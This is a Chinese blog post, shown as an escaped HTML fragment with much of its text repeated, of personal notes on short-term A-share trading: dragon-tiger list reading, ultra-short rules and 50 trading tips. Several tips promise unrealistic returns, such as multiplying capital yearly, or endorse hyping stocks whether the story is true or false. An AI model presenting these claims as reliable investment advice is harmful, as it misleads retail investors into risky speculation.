，太美好的东西其背后一定掩饰着什么。</p>\n<h2 id=\"超短\"><a href=\"#超短\" class=\"headerlink\" title=\"超短\"></a>超短</h2><p>以下是一个很激进的原则，并不能认可太多</p>\n<p>超短线的精髓在于做的是自己市值的主升浪，而不是某支股票的主升浪。从百万到千万到亿，是做人生的主升浪。这个大逻辑必须非常清楚。我很懂，自己为何做超短线！目标必须是亿为单位，不能目光短浅！我的操作纪律：</p>\n<p>1.永不抄底，只做强势股追涨，只做上升通道。</p>\n<p>2.不做日成交额低于5亿的股票。</p>\n<p>3.持股周期1~3天，连扳预期除外，坚决不把超短投机失败了当价值投资来搞。</p>\n<p>4.只选热点概念和有板块效应的标，判断失败搞错热点果断割肉出货，热点持续卖飞再买回来，老想卖山顶的都是屌丝，卖飞买回来才是高富帅。</p>\n<p>5.只做牛票，不做牛市，宁可卖飞，也不傻等。</p>\n<p>选择交易这一行，挫折感和失败感会伴随我们一生，失败时我们会郁闷、会痛苦、会绝望；胜利时，我们会目空一切，以为自己掌握了股市赚钱的法宝，这些将会重复，未来将战无不胜，万亿富翁指日可待。交易虽时而欲哭无泪，时而高兴流泪，但我们却依然爱它，因为平淡的生活乏味，挑战的生活才有激情，才有梦想。在预判中跟随， 在跟随中应变，没有预判的跟随是盲从， 没有应变的预判是意淫。找对路，并坚持！</p>\n<p>生活里注定会有许多风雨，认识人生是一种欣然的态度和热爱，一路上的经过，如果你坚持不下去了，请想想当初的那般热情。股市常有迷茫的时候，只要熬过了，就没什么可以打败你。</p>\n<blockquote>\n<p>它文章挺老了，但是毕竟是经验</p>\n</blockquote>\n<h2 id=\"《什么样的人不适合做超短》\"><a href=\"#《什么样的人不适合做超短》\" class=\"headerlink\" title=\"《什么样的人不适合做超短》\"></a>《什么样的人不适合做超短》</h2><p>1.上班族，请不要做超短。</p>\n<p>2.没有强大的内心，股票随便动一下就激动的，请不要做超短。</p>\n<p>3.做不到一天四小时盯盘，盘后至少四个小时复盘的，请不要做超短。</p>\n<p>4.对技术面一窍不通的，请不要做超短。</p>\n<p>5.新入市两年内的韭菜，请不要做超短。</p>\n<p>6.没有独立思考判断能力的，请不要做超短。</p>\n<p>7.有家庭生活压力的，请不要做超短。</p>\n<p>8.盘中无法做到跟随应变的，请不要做超短。</p>\n<p>9.无法容忍回撤，做不好风控的，请不要做超短</p>\n<p>10.买卖点都在一瞬间，肾不好的，请不要做超短。</p>\n<h2 id=\"《什么样的股票不能买》\"><a href=\"#《什么样的股票不能买》\" class=\"headerlink\" title=\"《什么样的股票不能买》\"></a>《什么样的股票不能买》</h2><p>1、大势趋向空时，不买，买多不买空</p>\n<p>2、整体板块走势不好时，不买，龙头板块，行情需要3、30日均线正在下降或股价处于30日均线下方的，不买，破生命线</p>\n<p>4、股性不好的股票，不买，买股买善庄</p>\n<p>5、突破点成交量表现不佳的，不买。换手率不够不买</p>\n<p>6、成交量巨量时不买，巨量止盈不买</p>\n<p>7、能量或动量过大时不买，涨幅过高却没有调整不买</p>\n<p>8、技术指标不成熟的股票，不买，油未加足</p>\n<p>9、当价格趋势后势不明朗时不买，方向不明不买</p>\n<p>10、不具有宽广底部的股票不买，横有多长，竖有多高</p>\n<p>11、正在缓慢下跌，已走下降通道的个股，不买，下水道中无好货</p>\n<p>12、曾被恶炒过，庄家已撤离或正在撤离的个股，不买，花无百日红</p>\n<p>13、盘整时期，在盘中突然拉起一根大阳线的股票，不买，积弱难返</p>\n<p>14、突破盘局后，已出现连续三根大阳线且无调整（30%以上）不买</p>\n<p>15、第一次冲高到前期高点附近，只要不涨停不买，挑顶卖货</p>\n<p>16、不具备短均线多头排列不买，均线不好</p>\n<p>17、不论走势如何好，也不买涨势发动太久之后的股票，追高不买</p>\n<p>18、宁可错过一次赚钱的机会，也不买任何风险大于报酬的个股</p>\n<p>19、只要身在股市，就永远不猜测底部，也不预测顶部，终生顺势而为</p>\n<p>20、每波行情中，总有主流、支流、末流（跟风）板块之分，要想跑赢大势，就必须紧跟主流板块，特别是领涨股！骑马要骑大黑马，买股要买龙头股</p>\n<h2 id=\"纪律篇\"><a href=\"#纪律篇\" class=\"headerlink\" title=\"纪律篇\"></a>纪律篇</h2><p>1.炒作题材股就是讲故事，不管故事是真的还是假的，只要讲的好就行。　　</p>\n<p>2.成交量已很小很长时间了，只要量不放大就以横盘下跌为主，可以先出来，即使反弹如果量还这么小的话高度有限。等成交量大了再进去，免得在里面受折磨。　　</p>\n<p>3.不要买入太多的太便宜的股票，低于5元的股票都是很垃圾的，不要以为便宜就不跌了，往往这样的股票反弹的很慢，重点关注10元左右的股票，活跃度比较高。　　</p>\n<p>4.选择自己熟悉的股票进行投资，对于熟悉的股票，我们已经知道它的“脾气”，知道何时买何时卖。    </p>\n<p>5.买股票一定要冷静，必须有80%以上的把握，宁愿踏空也不要被套。赚钱了卖股可以随意一些，只是赚多赚少的问题。一定要锻炼自己的心理克服盲目追高。　　</p>\n<p>6.图很好已经形成了底部，并且持续放量依托5日线稳步上涨，符合我的选股标准。　　</p>\n<p>7.股性不活跃，比中石油和工行还笨，涨的很慢，被这样的股票套上了很麻烦。即使大盘再创新高这只股票也涨不了多少。　　</p>\n<p>8.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　</p>\n<p>9.买点非常关键，不论在什么行情，除非特别强势股，最好是逢低介入。    </p>\n<p>10.理智投资，克制情绪，投资股票要有良好的心理素质。股民通常都会对股票的涨跌产生情绪化，从而影响操作。切忌不可情绪化，一定要学会自我控制，理智投资。有时股民们会由于一时冲动而贸然建仓，也有时候会和某一支股票“较劲”，斩仓在“地板价”上。机会随时都会出现，没必要因一时冲动而导致资金大损。　　</p>\n<p>11.买股票不论哪个板快都要买龙头，我所说的龙头股不是名气大的盘子大的而是涨的多的、涨的快的股票。同样上涨龙头股比其他跟风的要多涨很多，而且又抗跌。要买就要买龙头股票，不能因为涨的多不敢买。比如近期的乐视网、全通教育等。　　</p>\n<p>12.在弱势中突破新高的股票值得重点关注。　　</p>\n<p>13.短线操作具备以下几个条件</p>\n<pre><code>1、要有原则不要计较一天的得失要敢于止损。\n2、喜欢追热点要有胆量不怕追高。\n3、我一般在开盘15分钟和收盘前30分钟买股票。　　\n</code></pre><p>14.大家买股票除了看指数外还要看上海市场涨幅超过6%的股票有多少，如果太少的话就不要参与。    </p>\n<p>15.止损和控制仓位是炒股的第一步，第二步就要锻炼自己的心理素质。在行情不好的时候尽量少参与，甚至一个星期买一次，每一次赚3%一年你也能赚很多。　　</p>\n<p>16.不但要有好股票，更重要的是买点和卖点，后者更关键这个只能靠自己把握。　　</p>\n<p>17.买的股票主要有以下三类</p>\n<pre><code>1.突破箱式震荡创新高的\n2.热点题材股\n3。底部放量的特别是现在形成头肩底或者双底走势的。　　\n</code></pre><p>18.如果资金不是很多的话股票最好不要超过3个。行情好的时候一般是2个行情不好的时候就1个。　　</p>\n<p>19.大盘在大幅上涨的时候一定要避免操作频繁，大盘震荡或下跌的时候频繁操作是好的。    </p>\n<p>20.大家以后买股票一定学习买点，再好的股票买高了也赚不到钱，再差的股票买的位置低也能赚钱。买卖点很关键甚至比股票好坏还重要。这个需要自己多观察多总结经验，最起码要学会看均线，短线看5日、10日线。大盘好的情况下，强势股调整一般不会破5日线，大盘差的时候顶多到10日线10日线是很好的介入机会。如果你大多数时间都在空仓专等强势股跌到10日线介入，假设一个月有3次这样的机会，每次赚8%，一年你都会赚好几倍。　　</p>\n<p>21.做短线要学会卖，不管手中的股票是涨是跌。在大盘不好的情况下只要手中的股票拉升，分批卖出以规避风险就没错。　　</p>\n<p>22.注重成交量，量在价先。看股主要看成交量，看成交量不用看K线图，基本就能知道一个股票的走势。　　</p>\n<p>23.我喜欢操作创新高的股票，一般来说创了新高的股票不会跌破前期的高点。这样的股票没有套牢盘，涨起来比较轻松，大都有比较凶悍的主力运作。买这样的股票是比较安全的。　　</p>\n<p>24.满仓持有一个股票，每天做T+0差价赚0.5%，难度并不大，一个月下来也有不错的收益。做T+0价差一定不能贪心要不很容易踏空。如果买入做差价，赚了一点卖一点，一边涨一边卖，防止一下跌很多。    </p>\n<p>25.果断出手，切忌犹豫不决。犹豫不决容易错失投资时机，在关键时期患得患失，不能把握到最佳的时机，说明他们对市场行情还没有准确的判断。在交易时要看成交量，如果指数大跌且成交量降到均量的一半以下，此时买进风险很低，正是投资的最佳时机，股民们应抓住这个时机，果断出手，切不可犹豫不决。　　</p>\n<p>26.从心理学的角度来说，越是认为是政策底往往就会跌破政策底。而且基金不讲政治，政府又出台不了实质性的政策，政策底往往是守不住的。　　</p>\n<p>27.大盘上方均线密集，没有一定的成交量是不可能突破的，即使突破了也会跌下来，所谓量在价先就是这个道理。　　</p>\n<p>28.KDJ中轴上方金叉不是坏事说明强势，这也是一直横盘整理的结果，BOLL线收窄选择方向。　　</p>\n<p>29.次新股最好不要碰这些股发行价都很高严重高估，上市后都要补跌。   </p>\n<p>30.缺口补的时间越长，大盘横盘的时间越长，对后市发展就越不利。　　</p>\n<p>31.炒股不能与趋势做对，更不能一相情愿。老是往好的地方想，总是想自己买的股票一定要涨。认为自己满仓了大盘明天肯定不会跌了。总是报有幻想在股市中是要不得的。　　</p>\n<p>32.波浪理论简单的说主要是上升5大浪，下跌3小浪，每一大浪又有多个小浪组成。虽然有马后炮的嫌疑，但从长远来看还是有很大借鉴意义的。　　</p>\n<p>33.我分析股票最重要的一个指标是成交量，一般来说股票要持续上涨必须要成交量放大，特别是股票技术横盘整理或向上突破重要点位必须拌有成交量放大。在连续上涨的股票中，只要当天的成交量高于上一天的成交量，如果大盘没有太大问题股票还是会冲高的。另除了成交量外首先要学会看均线排列和K线形态。掌握了这些基本就可以了。还有一些MACD、KDJ、BOLL等指标也比较常用，一般高手看了前面的均线排列、K线形态就知道后面这些指标的走势。当然分析的越全面越好多个指标同时用对股票把握的更准一些。　　</p>\n<p>34.一般来说能够连续拉升的股票，中后期一般开盘价不能超过2，如果过了说明庄家高开要放货了，一般低开1-2之间最好。    </p>\n<p>35.不要开盘就抛，这是一大忌。中间会有冲高的机会。　　</p>\n<p>36.当天要拉升的股票，一般来说控盘程度高，大盘跌它不怎么跌。对于短期涨幅不大的股票，波动空间很小上下不超过</p>\n<p>2。偶尔出现庄家对倒说明股票有异动。短期涨幅大的股票往往要下探到5日线。股票要拉升成交量要放大，一看放量了第一时间介入比晚介入要好。　　</p>\n<p>37.短线不入大盘股，短线不入机构重仓股，短线不入大小非股。　　</p>\n<p>38.股市的高手最主要的不是技术而是心理。只有心理成熟了你才能驾御这个市场。人的心理、性格、志向在股票操作中暴漏无遗。　　</p>\n<p>39.一般来说不要买跌停板上的股票。       </p>\n<p>40.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　</p>\n<p>41.永远不要相信电视台的股评“老师们”。如果他们真能说对明天哪只股票涨停，还有必要从事股评这份“很有前途的职业”么？　　</p>\n<p>42.你抓住一个股票的K线图，看了又看最终你会发现规律。　　</p>\n<p>43.普涨行情下不要频繁换股，普涨行情下买股票很容易被套要买就等收盘前2分钟买，因为好股票都涨停了，差的股票你买后很容易回落。　　</p>\n<p>44.强势股如果趁大盘跌而下跌，是很好的介入机会。       </p>\n<p>45.更多的人可能有这样的想法：如果买了这个股票总是想这个股票好的一面，不想它差的一面，甚至更听不进去别人说他不好。这种情况就是心理学中的选择性扭曲。　　</p>\n<p>46.一个股票虽然看好，但不一定什么时间都可以买。股票的买点和卖点非常关键比选择股票还重要。再好的股票没买到好位置也赚不了钱。所以如果错过了买入的机会，不要看到别人赚钱自己心理不平衡贸然就冲进去了，结果买在了最高点这是一大忌。克服了这一个毛病就能能成为股市的高手。　　</p>\n<p>48.有基金的股票很难大涨的，一涨它就卖。　　</p>\n<p>49.一大阴击穿所有的均线，应该也是离场的信号。　　</p>\n<p>50.大盘跳水不要急于卖股票等它再反弹一波的高点卖。更不能在急跌的时候卖股票这样很容易卖在最低价。</p>\n<h2 id=\"《龙虎榜》\"><a href=\"#《龙虎榜》\" class=\"headerlink\" title=\"《龙虎榜》\"></a>《龙虎榜》</h2><p>看龙虎榜主要是为了揣摩当前市场中最活跃，最顶尖的资金操盘的思路，不管是机构也好游资也好，这些活跃在市场最前沿的资金基本代表了国内最顶尖的操盘水平。而通过龙虎榜观察他们的选股与操盘手法使自己的操作逻辑尽可能靠近市场主流资金的逻辑，这才是龙虎榜最大的意义，因为这些资金特别是游资基本都是小资金做大的，处于整个股市生物链的顶部。</p>\n<p>首先，什么是龙虎榜？龙虎榜是交易所公布的当日异动股票汇总。上榜主要有四个条件：1、日价格涨幅偏离值±7%</p>\n<p>2、日换手率达到20%</p>\n<p>3、日价格振幅达到15%</p>\n<p>4、连续三个交易日内，涨幅偏离值累计达到20%每个条件都选前3名的上榜，深市是分主板、中小板、创业板分别取前3的。具体的大家百度百科，解释龙虎榜不是今天的重点。</p>\n<p>大家应该看到了我上面加粗的两个字“异动”，关键就在这异动上面。谁才有能力让股票的价格出现异动，只有所谓的主力，散户的散单是肯定做不到的，说到主力很多人觉得很神秘，而且喜欢把机构统称主力，其实大家不必太看重名词上的东西，只要是能影响到股价走势的都是可以称为主力，包括机构跟游资。研究散户你永远只能是散户，只有研究主力才能让你进步，而龙虎榜就是我们研究主力操盘选股思路的最好窗口。其次，怎么看龙虎榜？龙虎榜上有两种席位，一种是机构席位，一种是游资席位。机构席位就是什么公募啊、私募啊等等法人账户，他们的资金一般是募集而来，且上榜统一名称为“机构专用”，所以没什么好研究的。而游资席位不一样，游资席位都是自然人账户，就是跟广大散户朋友账户一样的。且游资大部分都是从小资金做起来，而且可以持续跟踪关注，他们才是我们研究对象。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>所以就要做一些笔记呗</p>\n<p>有一些摘自知乎和雪球。观点和意见都不尽同意。</p>\n<h2 id=\"《如何看懂龙虎榜》\"><a href=\"#《如何看懂龙虎榜》\" class=\"headerlink\" title=\"《如何看懂龙虎榜》\"></a>《如何看懂龙虎榜》</h2><p>一、纯游资对决(交易席位均为游资)  </p>\n<p>1、买卖双方力量比对，买方总金额越大越好。买方席位前5名的总资金要远大于卖方席位前5名总资金。并且买一的资金要远大于卖一的资金，最好是1.5倍以上。而买一和买二的金额差不能太大，否则会容易造成一家独大，后市意味着抛压也大。</p>\n<p>2、如果是第一次涨停，在龙虎榜交易数据当中，买方数据为纯买入最好，表示新进资金入场后市还将走高。另外第一次涨停后留意买一席位是直接出局、锁仓、继续加码买进还是做差价？通常直接出局代表了行情一日游，锁仓说明行情可持续，等待别的资金接力拉高。继续加码买进表示强烈看好。做差价说明买一实力不够强。个股的大行情都是游资接力完成的，不会是某一个游资来推动整轮行情的发展。因此通常2-3个涨停之后如果买一继续锁仓，别的游资只会是观望了，因为持仓量太大造成的抛压也大。只有当买一出局后，别的游资才考虑进场接力拉升。所以说行情的初中期换手率是一个非常重要的参考指标。一个游资的离去会吸引另外游资的进驻。另外还有一种情况就是边拉升边对倒的游资，对倒涨停是为了投入少量的资金来达到涨停效应，持续力不会太强。</p>\n<p>3、留意游资的身份和操盘风格，是一线知名游资还是名不见经传的游资？在最近是否经常上榜？操盘风格如何？一日游为主还是波段为主或者是喜欢与机构共舞等等。通常一日游资口碑不太好，上榜了也不会对行情有推动作用，反而打击做多的积极性。波段游资则比较受欢迎。</p>\n<p>4、留意龙虎榜数据买方席位知名度，越知名越好，数量越多越好。比如银河绍兴路、光大杭州庆春路、光大奉化南山路、财通温岭东辉北路、中信杭州延安路、中信杭州定安路、华泰益田路荣超商务中心等这些著名游资出现3个以上，代表着一线游资对这个题材个股的高度认可，后市持续力强。</p>\n<p>二、游资和机构博弈(交易席位为游资机构混杂)</p>\n<p>1、买方中机构出现的数量越多越好，机构当日买入金额占总成交金额比例越大越好。一次性锁定筹码集中度越高越好。因为多家机构进驻的个股基本面都比较不错，符合市场调研评判的标准，通常引发中级行情！当游资和机构达成共识合力推升股价，短线往往爆发力比较强，后市继续上涨概率也很大。</p>\n<p>2、买方中的买一席位是机构最好，并且卖方的5个席位中不出现机构最好；</p>\n<p>3、如果买方席位和卖方席位均有机构出现，卖方的5个席位中机构出现的数量越少越好，金额越小越好。如果卖方的机构席位比买方机构席位旗鼓相当甚至还要多，说明机构之间分歧非常之大，短期方向具有不确定性，对于交易数据当中的游资席位来说也会打退堂鼓，应该观望等待明朗。</p>\n<p>4、当买方5个席位均为游资，而卖方所有席位均为机构的时候，说明机构早就有出局的想法，有可能是该股基本面发生了转变，或者其他的不确定性让机构调仓换股。另外这种情况也经常发生在股价炒作末期的高位，机构认为风险较大时就会组团出货，通常砸至跌停。</p>\n<p>5、当买方均为机构卖方全部为游资席位，如果股价已经在炒作高位，发生这样的交易数据则机构有利益输送嫌疑，利用机构效应吸引散户高位接盘来帮助游资顺利出货。记住：市场上没有100%的完美，太美好的东西其背后一定掩饰着什么。</p>\n<h2 id=\"超短\"><a href=\"#超短\" class=\"headerlink\" title=\"超短\"></a>超短</h2><p>以下是一个很激进的原则，并不能认可太多</p>\n<p>超短线的精髓在于做的是自己市值的主升浪，而不是某支股票的主升浪。从百万到千万到亿，是做人生的主升浪。这个大逻辑必须非常清楚。我很懂，自己为何做超短线！目标必须是亿为单位，不能目光短浅！我的操作纪律：</p>\n<p>1.永不抄底，只做强势股追涨，只做上升通道。</p>\n<p>2.不做日成交额低于5亿的股票。</p>\n<p>3.持股周期1~3天，连扳预期除外，坚决不把超短投机失败了当价值投资来搞。</p>\n<p>4.只选热点概念和有板块效应的标，判断失败搞错热点果断割肉出货，热点持续卖飞再买回来，老想卖山顶的都是屌丝，卖飞买回来才是高富帅。</p>\n<p>5.只做牛票，不做牛市，宁可卖飞，也不傻等。</p>\n<p>选择交易这一行，挫折感和失败感会伴随我们一生，失败时我们会郁闷、会痛苦、会绝望；胜利时，我们会目空一切，以为自己掌握了股市赚钱的法宝，这些将会重复，未来将战无不胜，万亿富翁指日可待。交易虽时而欲哭无泪，时而高兴流泪，但我们却依然爱它，因为平淡的生活乏味，挑战的生活才有激情，才有梦想。在预判中跟随， 在跟随中应变，没有预判的跟随是盲从， 没有应变的预判是意淫。找对路，并坚持！</p>\n<p>生活里注定会有许多风雨，认识人生是一种欣然的态度和热爱，一路上的经过，如果你坚持不下去了，请想想当初的那般热情。股市常有迷茫的时候，只要熬过了，就没什么可以打败你。</p>\n<blockquote>\n<p>它文章挺老了，但是毕竟是经验</p>\n</blockquote>\n<h2 id=\"《什么样的人不适合做超短》\"><a href=\"#《什么样的人不适合做超短》\" class=\"headerlink\" title=\"《什么样的人不适合做超短》\"></a>《什么样的人不适合做超短》</h2><p>1.上班族，请不要做超短。</p>\n<p>2.没有强大的内心，股票随便动一下就激动的，请不要做超短。</p>\n<p>3.做不到一天四小时盯盘，盘后至少四个小时复盘的，请不要做超短。</p>\n<p>4.对技术面一窍不通的，请不要做超短。</p>\n<p>5.新入市两年内的韭菜，请不要做超短。</p>\n<p>6.没有独立思考判断能力的，请不要做超短。</p>\n<p>7.有家庭生活压力的，请不要做超短。</p>\n<p>8.盘中无法做到跟随应变的，请不要做超短。</p>\n<p>9.无法容忍回撤，做不好风控的，请不要做超短</p>\n<p>10.买卖点都在一瞬间，肾不好的，请不要做超短。</p>\n<h2 id=\"《什么样的股票不能买》\"><a href=\"#《什么样的股票不能买》\" class=\"headerlink\" title=\"《什么样的股票不能买》\"></a>《什么样的股票不能买》</h2><p>1、大势趋向空时，不买，买多不买空</p>\n<p>2、整体板块走势不好时，不买，龙头板块，行情需要3、30日均线正在下降或股价处于30日均线下方的，不买，破生命线</p>\n<p>4、股性不好的股票，不买，买股买善庄</p>\n<p>5、突破点成交量表现不佳的，不买。换手率不够不买</p>\n<p>6、成交量巨量时不买，巨量止盈不买</p>\n<p>7、能量或动量过大时不买，涨幅过高却没有调整不买</p>\n<p>8、技术指标不成熟的股票，不买，油未加足</p>\n<p>9、当价格趋势后势不明朗时不买，方向不明不买</p>\n<p>10、不具有宽广底部的股票不买，横有多长，竖有多高</p>\n<p>11、正在缓慢下跌，已走下降通道的个股，不买，下水道中无好货</p>\n<p>12、曾被恶炒过，庄家已撤离或正在撤离的个股，不买，花无百日红</p>\n<p>13、盘整时期，在盘中突然拉起一根大阳线的股票，不买，积弱难返</p>\n<p>14、突破盘局后，已出现连续三根大阳线且无调整（30%以上）不买</p>\n<p>15、第一次冲高到前期高点附近，只要不涨停不买，挑顶卖货</p>\n<p>16、不具备短均线多头排列不买，均线不好</p>\n<p>17、不论走势如何好，也不买涨势发动太久之后的股票，追高不买</p>\n<p>18、宁可错过一次赚钱的机会，也不买任何风险大于报酬的个股</p>\n<p>19、只要身在股市，就永远不猜测底部，也不预测顶部，终生顺势而为</p>\n<p>20、每波行情中，总有主流、支流、末流（跟风）板块之分，要想跑赢大势，就必须紧跟主流板块，特别是领涨股！骑马要骑大黑马，买股要买龙头股</p>\n<h2 id=\"纪律篇\"><a href=\"#纪律篇\" class=\"headerlink\" title=\"纪律篇\"></a>纪律篇</h2><p>1.炒作题材股就是讲故事，不管故事是真的还是假的，只要讲的好就行。　　</p>\n<p>2.成交量已很小很长时间了，只要量不放大就以横盘下跌为主，可以先出来，即使反弹如果量还这么小的话高度有限。等成交量大了再进去，免得在里面受折磨。　　</p>\n<p>3.不要买入太多的太便宜的股票，低于5元的股票都是很垃圾的，不要以为便宜就不跌了，往往这样的股票反弹的很慢，重点关注10元左右的股票，活跃度比较高。　　</p>\n<p>4.选择自己熟悉的股票进行投资，对于熟悉的股票，我们已经知道它的“脾气”，知道何时买何时卖。    </p>\n<p>5.买股票一定要冷静，必须有80%以上的把握，宁愿踏空也不要被套。赚钱了卖股可以随意一些，只是赚多赚少的问题。一定要锻炼自己的心理克服盲目追高。　　</p>\n<p>6.图很好已经形成了底部，并且持续放量依托5日线稳步上涨，符合我的选股标准。　　</p>\n<p>7.股性不活跃，比中石油和工行还笨，涨的很慢，被这样的股票套上了很麻烦。即使大盘再创新高这只股票也涨不了多少。　　</p>\n<p>8.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　</p>\n<p>9.买点非常关键，不论在什么行情，除非特别强势股，最好是逢低介入。    </p>\n<p>10.理智投资，克制情绪，投资股票要有良好的心理素质。股民通常都会对股票的涨跌产生情绪化，从而影响操作。切忌不可情绪化，一定要学会自我控制，理智投资。有时股民们会由于一时冲动而贸然建仓，也有时候会和某一支股票“较劲”，斩仓在“地板价”上。机会随时都会出现，没必要因一时冲动而导致资金大损。　　</p>\n<p>11.买股票不论哪个板快都要买龙头，我所说的龙头股不是名气大的盘子大的而是涨的多的、涨的快的股票。同样上涨龙头股比其他跟风的要多涨很多，而且又抗跌。要买就要买龙头股票，不能因为涨的多不敢买。比如近期的乐视网、全通教育等。　　</p>\n<p>12.在弱势中突破新高的股票值得重点关注。　　</p>\n<p>13.短线操作具备以下几个条件</p>\n<pre><code>1、要有原则不要计较一天的得失要敢于止损。\n2、喜欢追热点要有胆量不怕追高。\n3、我一般在开盘15分钟和收盘前30分钟买股票。　　\n</code></pre><p>14.大家买股票除了看指数外还要看上海市场涨幅超过6%的股票有多少，如果太少的话就不要参与。    </p>\n<p>15.止损和控制仓位是炒股的第一步，第二步就要锻炼自己的心理素质。在行情不好的时候尽量少参与，甚至一个星期买一次，每一次赚3%一年你也能赚很多。　　</p>\n<p>16.不但要有好股票，更重要的是买点和卖点，后者更关键这个只能靠自己把握。　　</p>\n<p>17.买的股票主要有以下三类</p>\n<pre><code>1.突破箱式震荡创新高的\n2.热点题材股\n3。底部放量的特别是现在形成头肩底或者双底走势的。　　\n</code></pre><p>18.如果资金不是很多的话股票最好不要超过3个。行情好的时候一般是2个行情不好的时候就1个。　　</p>\n<p>19.大盘在大幅上涨的时候一定要避免操作频繁，大盘震荡或下跌的时候频繁操作是好的。    </p>\n<p>20.大家以后买股票一定学习买点，再好的股票买高了也赚不到钱，再差的股票买的位置低也能赚钱。买卖点很关键甚至比股票好坏还重要。这个需要自己多观察多总结经验，最起码要学会看均线，短线看5日、10日线。大盘好的情况下，强势股调整一般不会破5日线，大盘差的时候顶多到10日线10日线是很好的介入机会。如果你大多数时间都在空仓专等强势股跌到10日线介入，假设一个月有3次这样的机会，每次赚8%，一年你都会赚好几倍。　　</p>\n<p>21.做短线要学会卖，不管手中的股票是涨是跌。在大盘不好的情况下只要手中的股票拉升，分批卖出以规避风险就没错。　　</p>\n<p>22.注重成交量，量在价先。看股主要看成交量，看成交量不用看K线图，基本就能知道一个股票的走势。　　</p>\n<p>23.我喜欢操作创新高的股票，一般来说创了新高的股票不会跌破前期的高点。这样的股票没有套牢盘，涨起来比较轻松，大都有比较凶悍的主力运作。买这样的股票是比较安全的。　　</p>\n<p>24.满仓持有一个股票，每天做T+0差价赚0.5%，难度并不大，一个月下来也有不错的收益。做T+0价差一定不能贪心要不很容易踏空。如果买入做差价，赚了一点卖一点，一边涨一边卖，防止一下跌很多。    </p>\n<p>25.果断出手，切忌犹豫不决。犹豫不决容易错失投资时机，在关键时期患得患失，不能把握到最佳的时机，说明他们对市场行情还没有准确的判断。在交易时要看成交量，如果指数大跌且成交量降到均量的一半以下，此时买进风险很低，正是投资的最佳时机，股民们应抓住这个时机，果断出手，切不可犹豫不决。　　</p>\n<p>26.从心理学的角度来说，越是认为是政策底往往就会跌破政策底。而且基金不讲政治，政府又出台不了实质性的政策，政策底往往是守不住的。　　</p>\n<p>27.大盘上方均线密集，没有一定的成交量是不可能突破的，即使突破了也会跌下来，所谓量在价先就是这个道理。　　</p>\n<p>28.KDJ中轴上方金叉不是坏事说明强势，这也是一直横盘整理的结果，BOLL线收窄选择方向。　　</p>\n<p>29.次新股最好不要碰这些股发行价都很高严重高估，上市后都要补跌。   </p>\n<p>30.缺口补的时间越长，大盘横盘的时间越长，对后市发展就越不利。　　</p>\n<p>31.炒股不能与趋势做对，更不能一相情愿。老是往好的地方想，总是想自己买的股票一定要涨。认为自己满仓了大盘明天肯定不会跌了。总是报有幻想在股市中是要不得的。　　</p>\n<p>32.波浪理论简单的说主要是上升5大浪，下跌3小浪，每一大浪又有多个小浪组成。虽然有马后炮的嫌疑，但从长远来看还是有很大借鉴意义的。　　</p>\n<p>33.我分析股票最重要的一个指标是成交量，一般来说股票要持续上涨必须要成交量放大，特别是股票技术横盘整理或向上突破重要点位必须拌有成交量放大。在连续上涨的股票中，只要当天的成交量高于上一天的成交量，如果大盘没有太大问题股票还是会冲高的。另除了成交量外首先要学会看均线排列和K线形态。掌握了这些基本就可以了。还有一些MACD、KDJ、BOLL等指标也比较常用，一般高手看了前面的均线排列、K线形态就知道后面这些指标的走势。当然分析的越全面越好多个指标同时用对股票把握的更准一些。　　</p>\n<p>34.一般来说能够连续拉升的股票，中后期一般开盘价不能超过2，如果过了说明庄家高开要放货了，一般低开1-2之间最好。    </p>\n<p>35.不要开盘就抛，这是一大忌。中间会有冲高的机会。　　</p>\n<p>36.当天要拉升的股票，一般来说控盘程度高，大盘跌它不怎么跌。对于短期涨幅不大的股票，波动空间很小上下不超过</p>\n<p>2。偶尔出现庄家对倒说明股票有异动。短期涨幅大的股票往往要下探到5日线。股票要拉升成交量要放大，一看放量了第一时间介入比晚介入要好。　　</p>\n<p>37.短线不入大盘股，短线不入机构重仓股，短线不入大小非股。　　</p>\n<p>38.股市的高手最主要的不是技术而是心理。只有心理成熟了你才能驾御这个市场。人的心理、性格、志向在股票操作中暴漏无遗。　　</p>\n<p>39.一般来说不要买跌停板上的股票。       </p>\n<p>40.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　</p>\n<p>41.永远不要相信电视台的股评“老师们”。如果他们真能说对明天哪只股票涨停，还有必要从事股评这份“很有前途的职业”么？　　</p>\n<p>42.你抓住一个股票的K线图，看了又看最终你会发现规律。　　</p>\n<p>43.普涨行情下不要频繁换股，普涨行情下买股票很容易被套要买就等收盘前2分钟买，因为好股票都涨停了，差的股票你买后很容易回落。　　</p>\n<p>44.强势股如果趁大盘跌而下跌，是很好的介入机会。       </p>\n<p>45.更多的人可能有这样的想法：如果买了这个股票总是想这个股票好的一面，不想它差的一面，甚至更听不进去别人说他不好。这种情况就是心理学中的选择性扭曲。　　</p>\n<p>46.一个股票虽然看好，但不一定什么时间都可以买。股票的买点和卖点非常关键比选择股票还重要。再好的股票没买到好位置也赚不了钱。所以如果错过了买入的机会，不要看到别人赚钱自己心理不平衡贸然就冲进去了，结果买在了最高点这是一大忌。克服了这一个毛病就能能成为股市的高手。　　</p>\n<p>48.有基金的股票很难大涨的，一涨它就卖。　　</p>\n<p>49.一大阴击穿所有的均线，应该也是离场的信号。　　</p>\n<p>50.大盘跳水不要急于卖股票等它再反弹一波的高点卖。更不能在急跌的时候卖股票这样很容易卖在最低价。</p>\n<h2 id=\"《龙虎榜》\"><a href=\"#《龙虎榜》\" class=\"headerlink\" 